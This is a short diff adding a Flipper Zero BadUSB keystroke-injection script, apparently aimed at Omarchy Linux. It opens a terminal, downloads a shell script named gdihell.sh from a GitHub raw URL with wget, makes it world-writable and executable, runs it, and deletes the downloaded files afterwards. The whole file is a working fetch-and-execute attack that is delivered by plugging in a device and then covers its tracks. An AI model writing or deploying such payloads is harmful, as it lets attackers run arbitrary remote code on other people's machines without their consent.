@@ -1,0 +1,11 @@
+REM RUN DOWNLOADED .SH
+GUI ENTER
+DELAY 1000
+STRING wget https://raw.githubusercontent.com/knoxoxen/Omarchy-Flipper0-Badusb/main/launchers/gdihell/gdihell.sh
+ENTER
+DELAY 5000
+STRING chmod 777 gdihell.sh
+ENTER
+STRINGLN ./gdihell.sh
+STRING rm -f gdihell.sh gdihell-fx
+ENTER
